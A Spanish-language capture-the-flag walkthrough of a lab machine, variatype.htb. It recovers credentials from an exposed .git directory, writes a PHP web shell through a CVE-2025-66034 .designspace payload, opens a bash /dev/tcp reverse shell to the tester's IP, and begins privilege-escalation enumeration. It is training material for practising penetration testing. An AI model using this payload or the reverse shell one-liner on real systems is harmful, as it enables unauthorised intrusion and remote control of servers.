
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.10.76 -oG allPorts
```

```shell
  [*] IP Address: 10.129.10.76
  [*] Open ports: 22,80
```

```shell
nmap -p 22,80 -sCV -oN targeted 10.129.10.76
```

## HTTP
### variatype.htb

```shell
whatweb http://variatype.htb/
```

![[Pasted image 20260316130529.png]]

```shell
ffuf -c -u http://variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```shell
ffuf -c -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --mc=200
```


### portal.variatype.htb

```shell
whatweb http://portal.variatype.htb/
```

![[Pasted image 20260316132410.png]]

```shell
nuclei -target http://portal.variatype.htb/
```

```ad-info
http://portal.variatype.htb/.git/config
```

Se nos descarga un fichero donde encontramos
```shell
 [user]
     name = Dev Team
     email = dev@variatype.htb
```
Lo cual nos indica que ha hay un github

Dumpeamos el .git entero
```shell
 git-dumper http://portal.variatype.htb/.git/ ./git-portal
```

Buscamos cuantos commits ha habido
```shell
git log
```
Encontramos que ha habido varios commits, el actual es *HEAD* 

Y buscamos las diferencias entré el commit actual *HEAD (Commit actual)* y el ultimo commit que ha sucedido *HEAD~1 (Commit anterior)* 
```shell
git diff HEAD~1 HEAD
```

Encontramos como hubo una modificación en el archivo `auth.php` y encontramos las credenciales del usuario `gitbot`
```ad-hint
gitbot::G1tB0t_Acc3ss_2025!
```

Pudiendo usarlas y acceder al dashboard
![[Pasted image 20260316164815.png]]

Nos muestra que no hay fuentes recientes cargadas en el generador de fuentes que hemos visto en el subdominio anterior

Antes de continuar hacemos fuzzing sobre los directorios con la cookie del usuario obtenido
```shell
ffuf -c -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -b "PHPSESSID=9l19ilf84urobm3h3vaf96stop"
```

También buscamos ficheros sensibles filtrando por extensiones
```shell
ffuf -c -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -b "PHPSESSID=9l19ilf84urobm3h3vaf96stop" -e php,py,html
```

Encontrando el fichero `download.php` en el cual a la hora de acceder te pide el parámetro `file`, probaremos cargando un archivo y viendo como se le llama a este, en este caso se le llama con el parámetro `f`

![[Pasted image 20260316170954.png]]


Necesitaremos subir el archivo `.ttf` y el `.desingspace` explotando la vulnerabilidad `CVE-2025-66034` pudiendo encontrar una guía en `https://github.com/advisories/GHSA-768j-98cg-p3fv`, tendremos que subir los dos archivos e interceptar la petición pudiendo modificar el `malicious.designspace` para ejecutar un RCE

Cuando se modifica la petición incluimos el siguiente contenido en el `malicious.desingspace`
```xml
<?xml version='1.0' encoding='UTF-8'?> 
<designspace format="5.0">
	<axes> 
		<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
			<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname> 
		</axis>
	</axes>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location><dimension name="Weight" xvalue="100"/></location>
		</source> 
		<source filename="source-regular.ttf" name="Regular">
			<location><dimension name="Weight" xvalue="400"/></location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
</designspace>
```

Ahora accederemos a donde se almacena los fichero en `/files/shell.php` y vemos que podemos ejecutar comandos

![[Pasted image 20260317111343.png]]

Tenemos una WebShell, vamos a convertirlo en una ReverseShell
Primero tendremos que monernos en escucha
```shell
penelope -p 4444
```

Y en la web shell nos mandamos una bash con curl
```shell
bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.10.15.158%2F4444 0>%261'
```

Obteniendo la ReverseShell

En el `home` de la aplicacion encontramos un usuario llamdo `steve` vamos a intentar pivotar a el

Para escalar primero probaremos con permisos sudoers
```shell
sudo -l
```

En el cual se nos pide contraseña la cual no tenemos
Probaremos con SUID
```shell
find / -perm -4000 2>/dev/null
```
```shell
find / -perm -4000 -ls 2>/dev/null
```


No encontramos nada que nos pueda ser útil así que probaremos con las tareas cron, usaremos la herramienta [[PSPY]]
Nos descargamos la herramienta en nuestra maquina `https://github.com/DominicBreuker/pspy?tab=readme-ov-file`
Y nos abrimos un servidor con Python
```shell
python3 -m http.server 80
```

Y en la maquina victima lo descargamos en `/tml`
```shell
curl -O http://10.10.15.158/pspy64
```

Le damos permisos de ejecución
```shell
chmod +x pspy64
```

Y lo ejecutamos
```shell
./pspy64 -pf -i 1000
```

Encontramos un proceso corriendo bajo el usuario `steve`
```shell
/home/steve/bin/process_client_submissions.sh
```

Lo que debemos de hacer al no poder leer el proceso es buscar si hay alguna copia en la maquina o este esta renombrado de alguna forma
```shell
find / -name "*client*submission*" -o -name "*process*client*" 2>/dev/nul
```

Encontrándonos en `/opt` un archivo con el nombre `/opt/process_client_submissions.bak`
Al ver el proceso vemos que este trabaja con ficheros zip, en el cual solo valida el nombre del archivo sin validar su contenido asi que vamos a explotar esa rama
